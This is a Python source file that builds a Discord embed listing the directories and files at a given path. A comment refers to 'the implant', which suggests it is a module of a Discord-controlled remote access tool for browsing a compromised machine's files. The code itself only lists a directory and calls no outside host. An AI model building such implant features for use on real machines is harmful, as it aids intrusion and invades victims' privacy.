import discord
import os

def create_explorer_embed(path: str) -> discord.Embed:
    """
    Creates a Discord embed showing the contents of a given directory path.
    This is a non-interactive, one-shot function.
    """
    # If no path is given, default to the current working directory of the implant.
    if not path:
        path = '.'
    
    abs_path = os.path.abspath(path)
    
    embed = discord.Embed(title="File Explorer", description=f"**Listing for:** `{abs_path}`", color=discord.Color.orange())
    dirs, files = [], []

    try:
        with os.scandir(abs_path) as it:
            for entry in it:
                if entry.is_dir():
                    dirs.append(entry.name)
                else:
                    files.append(entry.name)
        dirs.sort(key=str.lower)
        files.sort(key=str.lower)

        dir_list_str = "\n".join(f"📁 `{d}`" for d in dirs) or "No sub-directories found."
        if len(dir_list_str) > 1024: dir_list_str = dir_list_str[:1020] + "\n..."
        embed.add_field(name="Directories", value=dir_list_str, inline=False)

        file_list_str = "\n".join(f"📄 `{f}`" for f in files) or "No files found."
        if len(file_list_str) > 1024: file_list_str = file_list_str[:1020] + "\n..."
        embed.add_field(name="Files", value=file_list_str, inline=False)
        
        embed.set_footer(text="To navigate, use ?explore with a new path.")

    except PermissionError:
        embed.clear_fields()
        embed.add_field(name="Error", value="⛔ **Permission Denied**", inline=False)
    except FileNotFoundError:
        embed.clear_fields()
        embed.add_field(name="Error", value="❌ **Directory Not Found**", inline=False)
    except Exception as e:
        embed.clear_fields()
        embed.add_field(name="Error", value=f"An unexpected error occurred: {e}", inline=False)
        
    return embed